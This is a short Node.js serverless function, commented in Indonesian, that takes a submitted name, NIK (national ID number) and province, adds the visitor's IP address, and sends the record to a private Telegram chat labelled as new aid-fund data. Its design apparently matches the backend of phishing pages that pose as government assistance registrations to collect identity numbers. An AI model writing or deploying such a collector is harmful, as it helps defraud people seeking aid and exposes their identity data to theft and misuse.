const fetch = require('node-fetch');

exports.handler = async function(event, context) {
    // Cek method
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }
    
    try {
        const data = JSON.parse(event.body);
        const { nama, nik, provinsi } = data;
        
        // Validasi data
        if (!nama || !nik || !provinsi) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Data tidak lengkap' })
            };
        }
        
        // Ambil token bot dari environment variable
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!BOT_TOKEN || !CHAT_ID) {
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Konfigurasi bot tidak lengkap' })
            };
        }
        
        // Format pesan untuk Telegram
        const message = `
🆕 DATA BARU DANA BANTUAN

📝 Nama: ${nama}
🆔 NIK: ${nik}
📍 Provinsi: ${provinsi}
⏰ Waktu: ${new Date().toLocaleString('id-ID')}
🌐 IP: ${event.headers['client-ip'] || 'Tidak diketahui'}
        `;
        
        // Kirim pesan ke Telegram
        const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const telegramResult = await telegramResponse.json();
        
        if (telegramResult.ok) {
            return {
                statusCode: 200,
                body: JSON.stringify({ 
                    success: true, 
                    message: 'Data berhasil dikirim ke Telegram' 
                })
            };
        } else {
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    error: 'Gagal mengirim ke Telegram',
                    details: telegramResult
                })
            };
        }
        
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Terjadi kesalahan internal',
                details: error.message 
            })
        };
    }
};
